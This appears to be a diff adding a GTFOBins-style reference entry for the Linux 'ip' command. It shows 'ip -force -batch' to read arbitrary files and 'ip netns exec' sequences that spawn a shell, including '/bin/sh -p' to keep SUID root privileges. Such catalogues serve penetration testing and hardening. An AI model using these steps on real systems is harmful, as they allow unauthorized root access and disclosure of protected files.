@@ -1,0 +1,37 @@
+ip
+==
+
+File read
+---------
+
+[Sudo]
+    ip -force -batch /path/to/input-file
+    The read file content is corrupted by error prints.
+
+[SUID]
+    ip -force -batch /path/to/input-file
+    The read file content is corrupted by error prints.
+
+[Unprivileged]
+    ip -force -batch /path/to/input-file
+    The read file content is corrupted by error prints.
+
+Shell
+-----
+
+[Sudo]
+    ip netns add foo
+ip netns exec foo /bin/sh
+ip netns delete foo
+
+[SUID]
+    ip netns add foo
+ip netns exec foo /bin/sh -p
+ip netns delete foo
+
+[Sudo]
+    ip netns add foo
+ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
+ip netns exec bar /bin/sh
+ip netns delete foo
+ip netns delete bar
